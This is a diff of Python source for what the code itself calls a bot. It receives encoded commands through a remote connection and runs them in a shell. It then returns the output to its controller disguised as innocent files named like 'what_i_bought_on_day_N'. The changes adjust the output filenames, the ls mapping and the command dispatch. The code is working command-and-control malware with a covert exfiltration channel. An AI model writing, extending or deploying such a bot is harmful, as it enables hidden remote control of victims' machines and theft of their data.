@@ -22,11 +22,9 @@ def random_string(length):
 
 
 def write_output(conn, counter, my_id, content):
-    path = "/what_i_did_on_day_" + str(counter)
-    if not conn.exist_file(path):
-        conn.create_file(path)
-    content = str(my_id) + "\n\n" + content + "\n\n"
+    path = "/what_i_bought_on_day_" + str(counter) + "_" + my_id + ".txt"
     content = translations.encode_string(content)
+    conn.create_file(path)
     conn.append_to_file(path, content)
 
 
@@ -42,7 +40,7 @@ def do_command(conn, counter, row):
         # command ls
         elif parts[4] == "list":
             param = translations.decode_string(row.split(' !A!N!D! ')[1])
-            command = "ls -a " + param
+            command = "ls " + param
         # command id
         elif parts[4] == "identity":
             command = "id"
@@ -59,12 +57,16 @@ def do_command(conn, counter, row):
             exit("Good bye")
         # TODO alive
 
-    # run command
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    stdout, stderr = process.communicate()
+    print("recognized command:", command)
 
-    # write output
-    write_output(conn, counter, BOT_ID, stdout)
+    if command:
+
+        # run command
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout, stderr = process.communicate()
+
+        # write output
+        write_output(conn, counter, BOT_ID, stdout)
 
 
 # unique ID of BOT
